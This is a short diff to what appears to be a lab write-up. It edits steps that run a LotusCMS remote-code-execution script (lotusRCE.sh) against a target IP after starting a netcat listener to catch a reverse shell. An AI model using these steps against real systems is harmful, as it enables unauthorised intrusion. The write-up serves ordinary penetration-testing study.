@@ -227,10 +227,15 @@ The script usage is:
 ./lotusRCE.sh target LotusCMS_path
 ```
 
-I started a listener and ran the script against the target.
+I started a listener.
 
 ```
 rlwrap nc -lvp 1234
+```
+
+Run the script against the target.
+
+```
 ./lotusRCE.sh 10.101.85.13 /
 ```
 
